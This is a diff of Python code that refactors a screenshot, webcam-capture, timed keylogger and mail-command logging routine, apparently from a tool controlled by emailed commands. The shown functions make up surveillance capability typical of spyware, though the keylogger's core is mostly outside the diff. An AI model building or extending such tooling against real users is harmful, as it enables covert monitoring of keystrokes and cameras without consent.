@@ -31,8 +31,10 @@ def check_ext(file_name) -> str:
     return file_name
 
 
-def capture_SS(file_name: str = "Picture.png") -> str:
+def capture_SS(cmd_list) -> str:
+    file_name = cmd_list[1] if len(cmd_list) > 1 else "Screenshot.png"
     check_ext(file_name)
+    
     file_name = "Files\\Pictures\\" + file_name
     with open(file_name, "w") as f:
         pass
@@ -42,9 +44,11 @@ def capture_SS(file_name: str = "Picture.png") -> str:
     return file_name
 
 
-def capture_webcam(file_name: str = "Webcam.png"):
+def capture_webcam(cmd_list):
+    file_name = cmd_list[1] if len(cmd_list) > 1 else "Webcam.png"
     check_ext(file_name)
-    cap = cv2.VideoCapture(0)
+    
+    cap = VideoCapture(0)
 
     message: str = ""
     file_name = "Files\\Pictures\\" + file_name
@@ -57,7 +61,7 @@ def capture_webcam(file_name: str = "Webcam.png"):
 
     success, frame = cap.read()
 
-    cv2.imwrite(file_name, frame)
+    imwrite(file_name, frame)
     cap.release()
     if not success:
         message = "ERROR: Cannot capture frame"
@@ -65,8 +69,10 @@ def capture_webcam(file_name: str = "Webcam.png"):
     return file_name, message
 
 
-def logger(duration: int) -> str:
+def logger(cmd_list):
     file_path: str = "Files\\Keylog.txt"
+    duration = int(cmd_list[1]) if len(cmd_list) > 1 else 5
+    
     # ? Ensure the existence of the file
     with open(file_path, "w") as f:
         pass
@@ -89,11 +95,11 @@ def logger(duration: int) -> str:
         sleep(duration)
         listener.stop()
 
-    return file_path
+    return file_path, duration
 
 
-def note2log(sender: str, cmd_list: list) -> str:
-    file_path: str = "Files\\mail.log"
+def note2log(sender, cmd_list, attachment, body):
+    file_path: str = "mail.log"
 
     with open(file_path, "a") as log:
         pass
@@ -102,13 +108,15 @@ def note2log(sender: str, cmd_list: list) -> str:
         filename=file_path,
         filemode="a",
         level=logging.INFO,
-        format="%(asctime)s - %(message)s",
-        datefmt="%d-%b-%y %H:%M:%S",
+        format="Time:\t\t%(asctime)s \n%(message)s",
+        datefmt="%d %b %Y %H:%M:%S",
     )
+    command = ' '.join(cmd_list)
+    attachment = ""
 
-    logging.info(f"From: {sender}, Command: {cmd_list}")
-
-    return file_path
+    line = f"From:\t\t{sender}\nContent:\t{command}\n\n"
+    line += f"Reply:\t\t {body}\nAttachment:\t{attachment}\n\n"
+    logging.info(line)
 
 
 def list_command() -> str:
